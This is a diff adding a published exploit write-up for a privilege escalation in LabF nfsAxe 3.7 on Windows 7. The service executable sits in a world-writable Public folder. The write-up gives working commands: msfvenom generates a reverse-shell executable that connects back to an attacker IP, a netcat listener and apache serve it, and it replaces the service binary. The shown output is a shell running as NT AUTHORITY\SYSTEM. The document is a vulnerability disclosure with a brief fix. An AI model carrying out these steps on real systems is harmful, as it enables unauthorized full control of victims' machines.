@@ -1,0 +1,55 @@
+Exploit Author: bzyo
+Twitter: @bzyo_
+Exploit Title: LabF nfsAxe 3.7 - Privilege Escalation
+Date: 03-24-2018
+Vulnerable Software: LabF nfsAxe 3.7
+Vendor Homepage: http://www.labf.com/
+Version: 3.7
+Software Link: http://www.labf.com/download/nfsaxe.exe
+Tested On: Windows 7 x86 and x64 *Requires Windows 7 Public Sharing to be enabled
+
+
+Details:
+By default LabF nfsAxe 3.7 installs to "C:\Users\Public\Program Files\LabF.com\nfsAxe" and installs
+a service called "XwpXSetSrvnfsAxe service". To start this service an executable "xsetsrv.exe" 
+is located in the same directory and also runs under Local System.
+
+By default in Windows with Public Folder sharing enabled, the permissions on any file/folder under "C:\Users\Public\" is Full Control
+for Everyone.  This means unprivileged users have the ability to add, delete, or modify any and all 
+files/folders.
+
+
+Exploit:
+1. Generate malicious .exe on attacking machine
+  msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.0.149 LPORT=443 -f exe > /var/www/html/xsetsrv.exe
+
+2. Setup listener and start apache on attacking machine
+  nc -nlvvp 443
+  service apache2 start
+ 
+3. Download malicious .exe on victim machine
+  Open browser to http://192.168.0.149/xsetsrv.exe and download
+
+4. Rename C:\Users\Public\Program Files\LabF.com\nfsAxe\xsetsrv.exe
+   xsetsrv.exe > xsetsrv.bak
+ 
+5. Copy/Move downloaded xsetsrv.exe file to C:\Users\Public\Program Files\LabF.com\nfsAxe\
+
+6. Restart victim machine and login as unprivileged user 
+
+7. Reverse Shell on attacking machine opens
+	C:\Windows\system32>whoami
+	whoami
+	nt authority\system
+
+Prerequisites:
+To successfully exploit this vulnerability, an attacker must already have access
+to a system running a LabF nfsAxe installed at the default location using a
+low-privileged user account
+
+Risk:
+The vulnerability allows local attackers to escalate privileges and execute
+arbitrary code as Local System aka Game Over.
+
+Fix:
+Don't use default install path
